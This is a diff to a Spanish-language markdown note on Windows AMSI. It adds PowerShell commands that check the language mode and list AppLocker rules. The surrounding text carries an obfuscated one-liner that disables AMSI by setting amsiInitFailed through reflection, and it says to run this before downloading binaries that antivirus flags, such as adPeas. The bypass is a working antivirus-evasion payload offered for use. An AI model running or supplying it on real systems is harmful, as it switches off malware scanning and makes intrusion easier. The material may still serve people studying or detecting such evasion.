@@ -32,6 +32,20 @@ La capacidad de AMSI para identificar amenazas en tiempo real lo convierte en un
 Los siguientes scripts los podemos ejecutar en la consola de  **Powershell**  antes de  ejecutar un comando que descargue un binario que detecte el antivirus como lo puede ser **adPeas**, etc... 
 
 ```powershell 
+❯ $ExecutionContext.SessionState.LanguageMode    # Mirar los tipos de lenguaje 
+
+	1. FullLanguage            # Acceso completo a todas las funcionalidades del lenguaje de Powershell
+	2. RestrictedLanguage      # Solo permite un subconjunto del lenguaje de Powershell 
+	3. ConstrainedLanguage     # Restringe el acceso a tipos .NET y a algunas capacidades del languaje 
+	4. NoLanguage              # Lenguage completamente deshabilitado 
+```
+
+```powershell 
+❯ Get-AppLockerPolicy -Effective 
+❯ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections 
+```
+
+```powershell 
 ❯ S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 ```
 
